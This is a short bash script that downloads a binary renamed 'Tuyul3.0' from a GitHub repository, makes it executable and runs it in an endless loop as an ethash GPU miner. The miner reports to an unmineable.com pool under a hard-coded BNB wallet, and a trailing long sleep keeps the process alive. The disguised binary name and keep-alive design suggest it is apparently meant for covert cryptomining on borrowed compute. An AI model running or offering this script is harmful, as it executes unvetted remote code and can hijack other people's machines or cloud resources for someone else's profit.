#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU)
wget https://github.com/NRC-TECH/nrc-tech/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
